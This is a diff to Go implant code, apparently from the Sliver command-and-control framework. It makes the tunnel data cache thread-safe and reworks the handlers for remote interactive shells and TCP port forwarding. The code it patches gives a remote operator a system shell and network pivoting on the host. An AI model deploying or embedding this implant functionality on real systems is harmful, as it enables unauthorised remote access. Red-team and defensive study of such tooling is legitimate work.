@@ -48,8 +48,62 @@ var (
 	}
 
 	// TunnelID -> Sequence Number -> Data
-	tunnelDataCache = map[uint64]map[uint64]*sliverpb.TunnelData{}
+	tunnelDataCache = dataCache{mutex: &sync.RWMutex{}, cache: map[uint64]map[uint64]*sliverpb.TunnelData{}}
 )
+
+type dataCache struct {
+	mutex *sync.RWMutex
+	cache map[uint64]map[uint64]*sliverpb.TunnelData
+}
+
+func (c *dataCache) Add(tunnelID uint64, sequence uint64, tunnelData *sliverpb.TunnelData) {
+	c.mutex.Lock()
+	defer c.mutex.Unlock()
+
+	if _, ok := c.cache[tunnelID]; !ok {
+		c.cache[tunnelID] = map[uint64]*sliverpb.TunnelData{}
+	}
+
+	c.cache[tunnelID][sequence] = tunnelData
+}
+
+func (c *dataCache) Get(tunnelID uint64, sequence uint64) (*sliverpb.TunnelData, bool) {
+	c.mutex.RLock()
+	defer c.mutex.RUnlock()
+
+	if _, ok := c.cache[tunnelID]; !ok {
+		return nil, false
+	}
+
+	val, ok := c.cache[tunnelID][sequence]
+
+	return val, ok
+}
+
+func (c *dataCache) DeleteTun(tunnelID uint64) {
+	c.mutex.Lock()
+	defer c.mutex.Unlock()
+
+	delete(c.cache, tunnelID)
+}
+
+func (c *dataCache) DeleteSeq(tunnelID uint64, sequence uint64) {
+	c.mutex.Lock()
+	defer c.mutex.Unlock()
+
+	if _, ok := c.cache[tunnelID]; !ok {
+		return
+	}
+
+	delete(c.cache[tunnelID], sequence)
+}
+
+func (c *dataCache) Len(tunnelID uint64) int {
+	c.mutex.RLock()
+	defer c.mutex.RUnlock()
+
+	return len(c.cache[tunnelID])
+}
 
 // GetTunnelHandlers - Returns a map of tunnel handlers
 func GetTunnelHandlers() map[uint32]TunnelHandler {
@@ -72,7 +126,11 @@ func tunnelCloseHandler(envelope *sliverpb.Envelope, connection *transports.Conn
 		connection.RemoveTunnel(tunnel.ID)
 		tunnel.Reader.Close()
 		tunnel.Writer.Close()
-		delete(tunnelDataCache, tunnel.ID)
+		tunnelDataCache.DeleteTun(tunnel.ID)
+	} else {
+		// {{if .Config.Debug}}
+		log.Printf("[tunnel][tunnelCloseHandler] Received close message for unknown tunnel id %d", tunnelClose.TunnelID)
+		// {{end}}
 	}
 }
 
@@ -81,11 +139,6 @@ func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	proto.Unmarshal(envelope.Data, tunnelData)
 	tunnel := connection.Tunnel(tunnelData.TunnelID)
 	if tunnel != nil {
-
-		if _, ok := tunnelDataCache[tunnelData.TunnelID]; !ok {
-			tunnelDataCache[tunnelData.TunnelID] = map[uint64]*sliverpb.TunnelData{}
-		}
-
 		// Since we have no guarantees that we will receive tunnel data in the correct order, we need
 		// to ensure we write the data back to the reader in the correct order. The server will ensure
 		// that TunnelData protobuf objects are numbered in the correct order using the Sequence property.
@@ -98,35 +151,34 @@ func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 		log.Printf("[tunnel] Cache tunnel %d (seq: %d)", tunnel.ID, tunnelData.Sequence)
 		// {{end}}
 
-		//Added a thread lock here because the incrementing of the ReadSequence, adding/deleting things from a shared cache,
-		//and then making decisions based on the current size of the cache by multiple threads can cause race conditions errors
-		var l sync.Mutex
-		l.Lock()
-		tunnelDataCache[tunnel.ID][tunnelData.Sequence] = tunnelData
+		tunnelDataCache.Add(tunnel.ID, tunnelData.Sequence, tunnelData)
 
 		// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
 		// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
 		// is used here whereas WriteSequence is used for data written back to the server
 
 		// Go through cache and write all sequential data to the reader
-		cache := tunnelDataCache[tunnel.ID]
-		for recv, ok := cache[tunnel.ReadSequence]; ok; recv, ok = cache[tunnel.ReadSequence] {
+		for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {
 			// {{if .Config.Debug}}
 			log.Printf("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
 			// {{end}}
 			tunnel.Writer.Write(recv.Data)
 
 			// Delete the entry we just wrote from the cache
-			delete(cache, tunnel.ReadSequence)
-			tunnel.ReadSequence++ // Increment sequence counter
+			tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())
+			tunnel.IncReadSequence() // Increment sequence counter
+
+			// {{if .Config.Debug}}
+			log.Printf("[message just received] %v", tunnelData)
+			// {{end}}
 		}
 
 		//If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.
 		//Send a Resend packet to have the msg resent from the cache
-		if len(cache) > 3 {
+		if tunnelDataCache.Len(tunnel.ID) > 3 {
 			data, err := proto.Marshal(&sliverpb.TunnelData{
-				Sequence: tunnel.WriteSequence, // The tunnel write sequence
-				Ack:      tunnel.ReadSequence,
+				Sequence: tunnel.WriteSequence(), // The tunnel write sequence
+				Ack:      tunnel.ReadSequence(),
 				Resend:   true,
 				TunnelID: tunnel.ID,
 				Data:     []byte{},
@@ -137,17 +189,16 @@ func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 				// {{end}}
 			} else {
 				// {{if .Config.Debug}}
-				log.Printf("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence)
+				log.Printf("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence())
 				// {{end}}
 				connection.RequestResend(data)
 			}
 		}
-		//Unlock
-		l.Unlock()
 
 	} else {
 		// {{if .Config.Debug}}
 		log.Printf("[tunnel] Received data for nil tunnel %d", tunnelData.TunnelID)
+		log.Printf("[message just transfered] %v", tunnelData)
 		// {{end}}
 	}
 }
@@ -162,15 +213,15 @@ type tunnelWriter struct {
 func (tw tunnelWriter) Write(data []byte) (int, error) {
 	n := len(data)
 	data, err := proto.Marshal(&sliverpb.TunnelData{
-		Sequence: tw.tun.WriteSequence, // The tunnel write sequence
-		Ack:      tw.tun.ReadSequence,
+		Sequence: tw.tun.WriteSequence(), // The tunnel write sequence
+		Ack:      tw.tun.ReadSequence(),
 		TunnelID: tw.tun.ID,
 		Data:     data,
 	})
 	// {{if .Config.Debug}}
-	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d", n, tw.tun.WriteSequence, tw.tun.ReadSequence)
+	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d, data: %s", n, tw.tun.WriteSequence(), tw.tun.ReadSequence(), data)
 	// {{end}}
-	tw.tun.WriteSequence++ // Increment write sequence
+	tw.tun.IncWriteSequence() // Increment write sequence
 	tw.conn.Send <- &sliverpb.Envelope{
 		Type: sliverpb.MsgTunnelData,
 		Data: data,
@@ -190,30 +241,31 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	}
 
 	shellPath := shell.GetSystemShellPath(shellReq.Path)
-	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
+	systemShell, err := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
 	if systemShell == nil {
 		// {{if .Config.Debug}}
 		log.Printf("[shell] Failed to get system shell")
 		// {{end}}
 		return
 	}
-	go systemShell.StartAndWait()
-	// Wait for the process to actually spawn
-	for {
-		if systemShell.Command.Process == nil {
-			// {{if .Config.Debug}}
-			log.Printf("[shell] Waiting for process to spawn ...")
-			// {{end}}
-			time.Sleep(time.Second)
-		} else {
-			break
-		}
+
+	// At this point, comand is already started by StartInteractive
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] Failed to spawn! err: %v", err)
+		// {{end}}
+		return
+	} else {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] Process spawned!")
+		// {{end}}
 	}
-	tunnel := &transports.Tunnel{
-		ID:     shellReq.TunnelID,
-		Reader: systemShell.Stdout,
-		Writer: systemShell.Stdin,
-	}
+
+	tunnel := transports.NewTunnel(
+		shellReq.TunnelID,
+		systemShell.Stdout,
+		systemShell.Stdin,
+	)
 	connection.AddTunnel(tunnel)
 
 	shellResp, _ := proto.Marshal(&sliverpb.Shell{
@@ -229,9 +281,8 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	// Cleanup function with arguments
 	cleanup := func(reason string) {
 		// {{if .Config.Debug}}
-		log.Printf("[shell] Closing tunnel %d (%s)", tunnel.ID, reason)
+		log.Printf("[shell] Closing tunnel request %d (%s)", tunnel.ID, reason)
 		// {{end}}
-		connection.RemoveTunnel(tunnel.ID)
 		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
 			Closed:   true,
 			TunnelID: tunnel.ID,
@@ -243,22 +294,23 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	}
 
 	go func() {
-		for {
-			tWriter := tunnelWriter{
-				tun:  tunnel,
-				conn: connection,
-			}
-			_, err := io.Copy(tWriter, tunnel.Reader)
-			if systemShell.Command.ProcessState != nil {
-				if systemShell.Command.ProcessState.Exited() {
-					cleanup("process terminated")
-					return
-				}
-			}
-			if err == io.EOF {
-				cleanup("EOF")
+		tWriter := tunnelWriter{
+			tun:  tunnel,
+			conn: connection,
+		}
+		_, err := io.Copy(tWriter, tunnel.Reader)
+
+		systemShell.Wait() // sync wait, since we already locked in io.Copy, and it will release once it's done
+
+		if systemShell.Command.ProcessState != nil {
+			if systemShell.Command.ProcessState.Exited() {
+				cleanup("process terminated")
 				return
 			}
+		}
+		if err == io.EOF {
+			cleanup("EOF")
+			return
 		}
 	}()
 
@@ -285,11 +337,15 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	// {{if .Config.Debug}}
 	log.Printf("[portfwd] Dialing -> %s", remoteAddress)
 	// {{end}}
-	dst, err := defaultDialer.DialContext(context.Background(), "tcp", remoteAddress)
+
+	ctx, cancelContext := context.WithCancel(context.Background())
+
+	dst, err := defaultDialer.DialContext(ctx, "tcp", remoteAddress)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[portfwd] Failed to dial remote address %s", err)
 		// {{end}}
+		cancelContext()
 		return
 	}
 	if conn, ok := dst.(*net.TCPConn); ok {
@@ -302,11 +358,14 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	}
 
 	// Add tunnel
-	tunnel := &transports.Tunnel{
-		ID:     portfwdReq.TunnelID,
-		Reader: dst,
-		Writer: dst,
-	}
+	// {{if .Config.Debug}}
+	log.Printf("[portfwd] Creating tcp tunnel")
+	// {{end}}
+	tunnel := transports.NewTunnel(
+		portfwdReq.TunnelID,
+		dst,
+		dst,
+	)
 	connection.AddTunnel(tunnel)
 
 	// Send portfwd response
@@ -325,7 +384,8 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 		// {{if .Config.Debug}}
 		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
 		// {{end}}
-		connection.RemoveTunnel(tunnel.ID)
+		tunnel := connection.Tunnel(tunnel.ID)
+
 		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
 			Closed:   true,
 			TunnelID: tunnel.ID,
@@ -334,6 +394,9 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 			Type: sliverpb.MsgTunnelClose,
 			Data: tunnelClose,
 		}
+		connection.RemoveTunnel(tunnel.ID)
+		dst.Close()
+		cancelContext()
 	}
 
 	go func() {
@@ -341,7 +404,12 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 			tun:  tunnel,
 			conn: connection,
 		}
-		_, err := io.Copy(tWriter, tunnel.Reader)
+		n, err := io.Copy(tWriter, tunnel.Reader)
+		_ = n // avoid not used compiler error if debug mode is disabled
+		// {{if .Config.Debug}}
+		log.Printf("[tunnel] Tunnel done, wrote %v bytes", n)
+		// {{end}}
+
 		cleanup(err)
 	}()
 }
